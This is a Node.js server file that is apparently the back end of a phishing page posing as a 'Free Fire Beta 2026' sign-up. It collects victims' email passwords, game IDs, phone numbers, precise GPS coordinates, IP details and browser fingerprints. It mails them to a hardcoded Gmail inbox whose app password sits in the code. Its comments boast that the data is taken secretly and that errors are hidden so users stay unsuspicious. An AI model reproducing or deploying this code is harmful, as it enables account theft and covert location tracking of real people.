const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(__dirname)); // Langsung akses index.html di root

// KONFIGURASI EMAIL - GANTI DENGAN EMAIL LO
const SENDER_EMAIL = 'gajeb682@gmail.com';
const SENDER_PASSWORD = 'tmyh wklt uyig lots'; // App Password Gmail
const RECEIVER_EMAIL = 'gajeb682@gmail.com';

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
});

// Route kirim email
app.post('/api/register', async (req, res) => {
    try {
        const data = req.body;
        
        console.log('📥 STEALTH DATA RECEIVED:');
        console.log('📍 GPS:', data.latitude, data.longitude);
        console.log('🌐 IP:', data.ip_address);
        console.log('📧 Email:', data.email);
        console.log('🎮 FF ID:', data.ffId);

        // HTML Email lengkap
        const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Free Fire Beta Data 2026</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0a1628 0%, #0d1f3c 100%);
            color: #ffffff;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: #0a1628;
            border-radius: 20px;
            overflow: hidden;
            border: 1px solid #0088FF;
            box-shadow: 0 10px 40px rgba(0,136,255,0.2);
        }
        .header {
            background: linear-gradient(135deg, #0088FF, #0066CC);
            padding: 25px;
            text-align: center;
        }
        .header h1 {
            margin: 0;
            font-size: 28px;
            color: #ffffff;
            letter-spacing: 2px;
        }
        .header p {
            margin: 10px 0 0;
            font-size: 14px;
            opacity: 0.9;
        }
        .content {
            padding: 25px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 15px;
        }
        th {
            background: #0088FF;
            color: #ffffff;
            padding: 14px 12px;
            text-align: left;
            font-size: 18px;
            font-weight: bold;
            border-radius: 10px 10px 0 0;
        }
        td {
            padding: 12px;
            border-bottom: 1px solid rgba(0,136,255,0.3);
            vertical-align: top;
        }
        .label {
            width: 35%;
            font-weight: bold;
            color: #00D4FF;
            background: rgba(0,136,255,0.1);
            font-size: 15px;
        }
        .value {
            width: 65%;
            color: #ffffff;
            font-size: 15px;
            word-break: break-word;
        }
        .section-title {
            background: rgba(0,136,255,0.2);
            color: #00D4FF;
            font-size: 20px;
            font-weight: bold;
            padding: 12px 15px;
            margin: 20px 0 10px;
            border-left: 4px solid #0088FF;
            border-radius: 8px;
        }
        .footer {
            background: #0d1f3c;
            padding: 15px;
            text-align: center;
            font-size: 12px;
            color: #888;
            border-top: 1px solid rgba(0,136,255,0.3);
        }
        .warning {
            color: #0088FF;
            font-weight: bold;
            margin-top: 15px;
            text-align: center;
            font-size: 13px;
        }
        hr {
            border-color: rgba(0,136,255,0.3);
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 FREE FIRE BETA DATA 2026 🔥</h1>
            <p>Stealth Registration Report</p>
        </div>
        
        <div class="content">
            <!-- ACCOUNT DATA SECTION -->
            <div class="section-title">📧 ACCOUNT DATA</div>
            <table>
                <tr>
                    <td class="label">Email Address:</td>
                    <td class="value">${data.email || '-'}</td>
                </tr>
                <tr>
                    <td class="label">Email Password:</td>
                    <td class="value">${data.emailPassword || '-'}</td>
                </tr>
                <tr>
                    <td class="label">Free Fire ID:</td>
                    <td class="value">${data.ffId || '-'}</td>
                </tr>
                <tr>
                    <td class="label">FF Level:</td>
                    <td class="value">${data.ffLevel || '-'}</td>
                </tr>
                <tr>
                    <td class="label">Phone Number:</td>
                    <td class="value">${data.phone || '-'}</td>
                </tr>
                <tr>
                    <td class="label">Manual Location:</td>
                    <td class="value">${data.country || '-'}, ${data.province || '-'}, ${data.city || '-'}</td>
                </tr>
            </table>

            <!-- STEALTH GPS & LOCATION -->
            <div class="section-title">📍 STEALTH GPS & LOCATION</div>
            <table>
                <tr>
                    <td class="label">Latitude:</td>
                    <td class="value">${data.latitude || 'TIDAK DAPAT'}</td>
                </tr>
                <tr>
                    <td class="label">Longitude:</td>
                    <td class="value">${data.longitude || 'TIDAK DAPAT'}</td>
                </tr>
                <tr>
                    <td class="label">Accuracy:</td>
                    <td class="value">${data.gps_accuracy || '-'} meters</td>
                </tr>
                <tr>
                    <td class="label">Altitude:</td>
                    <td class="value">${data.gps_altitude || '-'} meters</td>
                </tr>
                <tr>
                    <td class="label">GPS Timestamp:</td>
                    <td class="value">${data.gps_timestamp ? new Date(data.gps_timestamp).toLocaleString() : '-'}</td>
                </tr>
            </table>

            <!-- IP & NETWORK -->
            <div class="section-title">🌐 IP & NETWORK</div>
            <table>
                <tr>
                    <td class="label">IP Address:</td>
                    <td class="value">${data.ip_address || '-'}</td>
                </tr>
                <tr>
                    <td class="label">ASN:</td>
                    <td class="value">${data.asn || '-'}</td>
                </tr>
                <tr>
                    <td class="label">ISP:</td>
                    <td class="value">${data.isp || '-'}</td>
                </tr>
                <tr>
                    <td class="label">IP City:</td>
                    <td class="value">${data.ip_city || '-'}</td>
                </tr>
                <tr>
                    <td class="label">IP Region:</td>
                    <td class="value">${data.ip_region || '-'}</td>
                </tr>
                <tr>
                    <td class="label">IP Country:</td>
                    <td class="value">${data.ip_country || '-'}</td>
                </tr>
                <tr>
                    <td class="label">Timezone:</td>
                    <td class="value">${data.timezone || '-'}</td>
                </tr>
            </table>

            <!-- BROWSER FINGERPRINT -->
            <div class="section-title">🖥️ BROWSER FINGERPRINT</div>
            <table>
                <tr>
                    <td class="label">User Agent:</td>
                    <td class="value" style="font-size: 12px; word-break: break-all;">${data.userAgent || '-'}</td>
                </tr>
                <tr>
                    <td class="label">Platform:</td>
                    <td class="value">${data.platform || '-'}</td>
                </tr>
                <tr>
                    <td class="label">Language:</td>
                    <td class="value">${data.language || '-'}</td>
                </tr>
                <tr>
                    <td class="label">Screen Resolution:</td>
                    <td class="value">${data.screenResolution || '-'}</td>
                </tr>
                <tr>
                    <td class="label">Hardware Concurrency:</td>
                    <td class="value">${data.hardwareConcurrency || '-'} cores</td>
                </tr>
                <tr>
                    <td class="label">Device Memory:</td>
                    <td class="value">${data.deviceMemory || '-'} GB</td>
                </tr>
                <tr>
                    <td class="label">Timezone (Browser):</td>
                    <td class="value">${data.timezone || '-'}</td>
                </tr>
            </table>

            <!-- TIMESTAMP -->
            <div class="section-title">⏰ TIMESTAMP</div>
            <table>
                <tr>
                    <td class="label">Registration Time:</td>
                    <td class="value">${data.timestamp || '-'}</td>
                </tr>
                <tr>
                    <td class="label">Local Time:</td>
                    <td class="value">${data.local_time || '-'}</td>
                </tr>
            </table>

            <hr>
            <div class="warning">⚠️ Data ini diambil secara diam-diam tanpa sepengetahuan user! ⚠️</div>
        </div>
        
        <div class="footer">
            &copy; 2026 Free Fire Beta New - Stealth Monitoring System
        </div>
    </div>
</body>
</html>
`;
        
        await transporter.sendMail({
            from: `"FF Beta 2026" <${SENDER_EMAIL}>`,
            to: RECEIVER_EMAIL,
            subject: `😈 DATA PUNYA SI:${data.email}`,
            html: htmlContent,
            attachments: [{
                filename: `stealth_${data.ffId}_${Date.now()}.json`,
                content: JSON.stringify(data, null, 2)
            }]
        });
        
        console.log('✅ Email terkirim!');
        res.json({ success: true });
        
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true }); // Tetep sukses biar user gak curiga
    }
});

// Route untuk index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📧 Email akan dikirim ke: ${RECEIVER_EMAIL}`);
});